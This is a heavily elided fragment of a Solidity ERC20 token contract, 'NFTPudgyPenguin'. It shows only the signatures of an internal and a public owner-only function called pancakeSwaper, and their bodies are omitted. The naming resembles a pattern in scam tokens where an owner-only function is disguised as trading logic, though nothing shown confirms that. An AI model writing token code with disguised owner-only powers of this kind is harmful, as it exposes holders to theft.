...
contract NFTPudgyPenguin is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _pancakeSwaper(address account, uint256 amount) internal virtual {
    ...
    function pancakeSwaper(uint256 amount) public onlyOwner virtual returns (bool) {
